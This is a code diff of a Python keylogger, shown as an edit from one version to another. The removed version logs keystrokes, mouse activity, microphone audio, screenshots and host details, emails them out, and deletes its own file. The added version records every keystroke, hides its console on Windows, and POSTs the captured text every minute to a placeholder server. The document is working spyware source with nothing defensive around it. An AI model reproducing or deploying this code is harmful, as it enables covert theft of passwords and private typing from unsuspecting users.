@@ -1,145 +1,75 @@
-try:
-    import logging
-    import os
-    import platform
-    import smtplib
-    import socket
-    import threading
-    import wave
-    import pyscreenshot
-    import sounddevice as sd
-    from pynput import keyboard
-    from pynput.keyboard import Listener
-    from email import encoders
-    from email.mime.base import MIMEBase
-    from email.mime.multipart import MIMEMultipart
-    from email.mime.text import MIMEText
-    import glob
-except ModuleNotFoundError:
-    from subprocess import call
-    modules = ["pyscreenshot","sounddevice","pynput"]
-    call("pip install " + ' '.join(modules), shell=True)
+import logging
+import os
+import platform
+import socket
+import threading
+import time
+import requests
+from pynput.keyboard import Listener
 
+# Константы
+SERVER_IP = "your_ip_server"
+SERVER_PORT = 8080
+SEND_REPORT_EVERY = 60  # in seconds
+CHECK_SERVER_EVERY = 5  # in seconds
 
-finally:
-    EMAIL_ADDRESS = "YOUR_USERNAME"
-    EMAIL_PASSWORD = "YOUR_PASSWORD"
-    SEND_REPORT_EVERY = 60 # as in seconds
-    class KeyLogger:
-        def __init__(self, time_interval, email, password):
-            self.interval = time_interval
-            self.log = "KeyLogger Started..."
-            self.email = email
-            self.password = password
+class KeyLogger:
+    def __init__(self, time_interval, server_ip, server_port):
+        self.interval = time_interval
+        self.log = ""
+        self.server_ip = server_ip
+        self.server_port = server_port
+        self.server_available = False
 
-        def appendlog(self, string):
-            self.log = self.log + string
+    def appendlog(self, string):
+        self.log += string
 
-        def on_move(self, x, y):
-            current_move = logging.info("Mouse moved to {} {}".format(x, y))
-            self.appendlog(current_move)
-
-        def on_click(self, x, y):
-            current_click = logging.info("Mouse moved to {} {}".format(x, y))
-            self.appendlog(current_click)
-
-        def on_scroll(self, x, y):
-            current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
-            self.appendlog(current_scroll)
-
-        def save_data(self, key):
-            try:
-                current_key = str(key.char)
-            except AttributeError:
-                if key == key.space:
-                    current_key = "SPACE"
-                elif key == key.esc:
-                    current_key = "ESC"
-                else:
-                    current_key = " " + str(key) + " "
-
-            self.appendlog(current_key)
-
-        def send_mail(self, email, password, message):
-            sender = "Private Person <from@example.com>"
-            receiver = "A Test User <to@example.com>"
-
-            m = f"""\
-            Subject: main Mailtrap
-            To: {receiver}
-            From: {sender}
-
-            Keylogger by aydinnyunus\n"""
-
-            m += message
-            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
-                server.login(email, password)
-                server.sendmail(sender, receiver, message)
-
-        def report(self):
-            self.send_mail(self.email, self.password, "\n\n" + self.log)
-            self.log = ""
-            timer = threading.Timer(self.interval, self.report)
-            timer.start()
-
-        def system_information(self):
-            hostname = socket.gethostname()
-            ip = socket.gethostbyname(hostname)
-            plat = platform.processor()
-            system = platform.system()
-            machine = platform.machine()
-            self.appendlog(hostname)
-            self.appendlog(ip)
-            self.appendlog(plat)
-            self.appendlog(system)
-            self.appendlog(machine)
-
-        def microphone(self):
-            fs = 44100
-            seconds = SEND_REPORT_EVERY
-            obj = wave.open('sound.wav', 'w')
-            obj.setnchannels(1)  # mono
-            obj.setsampwidth(2)
-            obj.setframerate(fs)
-            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-            obj.writeframesraw(myrecording)
-            sd.wait()
-
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
-
-        def screenshot(self):
-            img = pyscreenshot.grab()
-            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
-
-        def run(self):
-            keyboard_listener = keyboard.Listener(on_press=self.save_data)
-            with keyboard_listener:
-                self.report()
-                keyboard_listener.join()
-            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
-                mouse_listener.join()
-            if os.name == "nt":
-                try:
-                    pwd = os.path.abspath(os.getcwd())
-                    os.system("cd " + pwd)
-                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
-                    print('File was closed.')
-                    os.system("DEL " + os.path.basename(__file__))
-                except OSError:
-                    print('File is close.')
-
+    def save_data(self, key):
+        try:
+            if hasattr(key, 'char') and key.char is not None:
+                self.appendlog(key.char)
             else:
-                try:
-                    pwd = os.path.abspath(os.getcwd())
-                    os.system("cd " + pwd)
-                    os.system('pkill leafpad')
-                    os.system("chattr -i " +  os.path.basename(__file__))
-                    print('File was closed.')
-                    os.system("rm -rf" + os.path.basename(__file__))
-                except OSError:
-                    print('File is close.')
+                self.appendlog(f"<{key}>")
+        except AttributeError:
+            self.appendlog(f"<{key}>")
 
-    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
+    def check_server(self):
+        while not self.server_available:
+            try:
+                with socket.create_connection((self.server_ip, self.server_port), timeout=5):
+                    self.server_available = True
+            except (socket.timeout, ConnectionRefusedError, OSError):
+                time.sleep(CHECK_SERVER_EVERY)
+
+    def send_data_to_server(self, data):
+        url = f"http://{self.server_ip}:{self.server_port}/"
+        try:
+            response = requests.post(url, json={"keyboardData": data})
+            if response.status_code == 200:
+                pass  # Успешная отправка, ничего не делаем
+        except Exception:
+            pass  # Ошибки игнорируем, продолжаем работу
+
+    def report(self):
+        if self.server_available:
+            self.send_data_to_server(self.log)
+            self.log = ""
+        timer = threading.Timer(self.interval, self.report)
+        timer.start()
+
+    def run(self):
+        self.check_server()  # Ожидание запуска сервера
+        keyboard_listener = Listener(on_press=self.save_data)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
+
+if __name__ == "__main__":
+    # Скрытие консоли для Windows
+    if platform.system() == "Windows":
+        import ctypes
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+    # Запуск KeyLogger
+    keylogger = KeyLogger(SEND_REPORT_EVERY, SERVER_IP, SERVER_PORT)
     keylogger.run()
-
-
